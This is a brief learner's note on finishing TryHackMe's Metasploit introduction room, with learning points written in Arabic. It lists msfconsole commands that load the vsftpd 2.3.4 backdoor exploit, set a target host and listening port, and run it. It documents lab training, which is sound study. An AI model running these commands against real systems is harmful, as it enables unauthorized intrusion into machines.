# Metasploit: Introduction - TryHackMe

Room Link: https://tryhackme.com/room/metasploitintro
Status: ✅ Completed 100%

## What I Learned
- الفرق بين exploit, payload, auxiliary
- ازاي استخدم msfconsole
- ازاي اعمل search للـ modules
- ازاي اظبط RHOSTS و LPORT واعمل exploit

## Commands Used
```bash
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
setg RHOSTS <TARGET_IP>
set LPORT 6666
exploit
